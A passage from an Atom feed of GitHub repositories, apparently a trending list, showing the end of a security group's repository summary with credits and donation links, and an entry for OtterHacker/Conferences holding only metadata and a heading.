subz/#9x, DrWho, spoty Join us on &lt;a href=&#34;https://t.me/thcorg&#34;&gt;Telegram&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.buymeacoffee.com/hackerschoice&#34;&gt;&lt;img src=&#34;https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png&#34; alt=&#34;&amp;quot;Buy Me A Coffee&amp;quot;&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>OtterHacker/Conferences</title>
    <updated>2023-09-02T01:24:44Z</updated>
    <id>tag:github.com,2023-09-02:/OtterHacker/Conferences</id>
    <link href="https://github.com/OtterHacker/Conferences" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Conferences&lt;/h1&gt;</summary>
  </entry>
</feed>